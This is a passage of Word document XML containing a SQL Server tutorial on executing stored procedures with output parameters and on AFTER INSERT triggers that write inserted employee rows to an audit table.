          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t>1</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01BD2" w:rsidRPr="00584E67" w:rsidRDefault="00D01BD2" w:rsidP="00D01BD2">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="FF9900"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="FF9900"/>
        </w:rPr>
        <w:t>Execution of the Stored Procedure using the Output Parameter</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If we want to execute the Stored procedure "</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="990000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t>GetstudentnameInOutputVariable</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="111111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>" ,</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="111111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> then</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01BD2" w:rsidRPr="00584E67" w:rsidRDefault="00D01BD2" w:rsidP="00D01BD2">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:after="0"/>
        <w:rPr>
          <w:color w:val="111111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="111111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>we</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="111111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> first need to declare the variable to collect the output values. For example:</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keyword"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="0000FF"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t>Declare</w:t>
      </w:r>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as</w:t>
      </w:r>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hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="0000FF"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t>nvarchar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200</w:t>
      </w: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 Declaring the variable to collect the </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="code-comment"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="008000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t>Studentname</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Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="008000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="code-keyword"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="0000FF"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t>Declare</w:t>
      </w:r>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hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="0000FF"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t>as</w:t>
      </w:r>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hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="0000FF"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t>nvarchar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eastAsiaTheme="majorEastAsia" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000080"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t>50</w:t>
      </w:r>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xml:space="preserve">-- Declaring the variable to collect the </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="code-comment"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="008000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t>Studentemail</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hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="0000FF"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t>Execute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GetstudentnameInOutputVariable</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="code-digit"/>
          <w:rFonts w:ascii="Times New Roman" w:eastAsiaTheme="majorEastAsia" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000080"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t>1</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> ,</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Studentname</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> output,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 xml:space="preserve"> output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Studentname</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Studentemail</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">      </w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="code-comment"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="008000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t>-- "Select" Statement is used to show the output from Procedure</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Summary</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01BD2" w:rsidRPr="00584E67" w:rsidRDefault="00D01BD2" w:rsidP="00D01BD2">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:rPr>
          <w:color w:val="111111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="111111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>In the end, we can say that a Stored procedure not only enhances the possibility of reusing the code and execution plan, but it also increases the performance of the database by reducing the traffic of the network by reducing the amount of information sent over the network.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01BD2" w:rsidRPr="00584E67" w:rsidRDefault="00D01BD2" w:rsidP="00D01BD2">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:line="273" w:lineRule="atLeast"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:color w:val="555544"/>
        </w:rPr>
      </w:pP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pStyle w:val="Heading1"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:after="263"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="333333"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="333333"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>Triggers -- SQL Server</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Introduction</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01BD2" w:rsidRPr="00584E67" w:rsidRDefault="00D01BD2" w:rsidP="00D01BD2">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:rPr>
          <w:color w:val="111111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="111111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>Triggers in SQL Server</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Background</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01BD2" w:rsidRPr="00584E67" w:rsidRDefault="00D01BD2" w:rsidP="00D01BD2">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:rPr>
          <w:color w:val="111111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="111111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>This article gives a brief introduction about Triggers in SQL Server 2000/2005.</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What is a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 xml:space="preserve">A trigger is a special kind of a store procedure that executes in response to certain action on the table like insertion, deletion or </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="111111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>updation</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="111111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> of data. It is a database object which is bound to a table and is executed automatically. You can’t explicitly invoke triggers. The only way to do this is by performing the required action </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="111111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>no</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="111111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> the table that they are assigned to.</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 xml:space="preserve">Types </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="FF9900"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>Of</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="FF9900"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> Triggers</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01BD2" w:rsidRPr="00584E67" w:rsidRDefault="00D01BD2" w:rsidP="00D01BD2">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:rPr>
          <w:color w:val="111111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="111111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>There are three action query types that you use in SQL which are INSERT, UPDATE and DELETE. So, there are three types of triggers and hybrids that come from mixing and matching the events and timings that fire them. Basically, triggers are classified into two main types:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01BD2" w:rsidRPr="00584E67" w:rsidRDefault="00D01BD2" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="31"/>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After Triggers (For Triggers)</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01BD2" w:rsidRPr="00584E67" w:rsidRDefault="00D01BD2" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="31"/>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Instead Of Triggers</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(i) After Triggers</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01BD2" w:rsidRPr="00584E67" w:rsidRDefault="00D01BD2" w:rsidP="00D01BD2">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="111111"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="111111"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>These triggers run after an insert, update or delete on a table. They are</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="apple-converted-space"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="111111"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="Strong"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="111111"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t>not supported for views.</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="apple-converted-space"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="111111"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="111111"/>
        </w:rPr>
        <w:br/>
        <w:t>AFTER TRIGGERS can be classified further into three types as:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01BD2" w:rsidRPr="00584E67" w:rsidRDefault="00D01BD2" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="32"/>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AFTER INSERT Trigger.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01BD2" w:rsidRPr="00584E67" w:rsidRDefault="00D01BD2" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="32"/>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AFTER UPDATE Trigger.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01BD2" w:rsidRPr="00584E67" w:rsidRDefault="00D01BD2" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="32"/>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AFTER DELETE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 xml:space="preserve">Let’s create </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="111111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>After</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="111111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> triggers. First of all, let’s create a table and insert some sample data. Then, on this table, I will be attaching several triggers.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TABLE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Identity</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Emp_name</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>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Decimal</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> (</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="code-digit"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000080"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t>10</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2</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'Anees'</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1000</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'Rick'</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1200</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'John'</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1100</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'Stephen'</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1300</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INSERT</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'Maria'</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1400</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>);</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01BD2" w:rsidRPr="00584E67" w:rsidRDefault="00D01BD2" w:rsidP="00D01BD2">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:rPr>
          <w:color w:val="111111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="111111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>I will be creating an AFTER INSERT TRIGGER which will insert the rows inserted into the table into another audit table. The main purpose of this audit table is to record the changes in the main table. This can be thought of as a generic audit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Now, create the audit table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TABLE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Employee_Test_Audit</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Emp_name</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>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decimal</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> (</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="code-digit"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000080"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t>10</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>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2</w:t>
      </w:r>
      <w:proofErr w:type="gram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Audit_Action</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gram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proofErr w:type="gramEnd"/>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spellStart"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>Audit_Timestamp</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datetime</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w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="FF9900"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="FF9900"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>) After Insert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This trigger is fired after an INSERT on the table. Let’s create the trigger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lastRenderedPageBreak/>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trgAfterInsert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ON</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dbo</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>]</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>.[</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramEnd"/>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FOR</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INSERT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decimal</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2</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empname</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empsal</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audit_action</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'Inserted Record -- After Insert Trigger.'</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insert</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Employee_Test_Audit</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Emp_ID</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>,Emp</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>_Name,Emp_Sal,Audit_Action,Audit_Timestamp</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r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>,getdate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Style w:val="code-keyword"/>
          <w:rFonts w:ascii="Times New Roman" w:eastAsiaTheme="majorEastAsia" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="0000FF"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t>PRINT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'AFTER INSERT trigger fired.'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GO</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CREATE TRIGGER</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="apple-converted-space"/>
          <w:color w:val="111111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="111111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>statement is used to create the trigger.</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THE ON</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="apple-converted-space"/>
          <w:color w:val="111111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="111111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>clause specifies the table name on which the trigger is to be attached.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FOR INSERT</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="apple-converted-space"/>
          <w:color w:val="111111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="111111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>specifies that this is an</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AFTER INSERT</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="apple-converted-space"/>
          <w:color w:val="111111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="111111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>trigger. In place of</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FOR INSERT</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="111111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>,</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AFTER INSERT</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="apple-converted-space"/>
          <w:color w:val="111111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="111111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>can be used. Both of them mean the same.</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In the trigger body, table named</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="apple-converted-space"/>
          <w:color w:val="111111"/>
          <w:sz w:val="22"/>
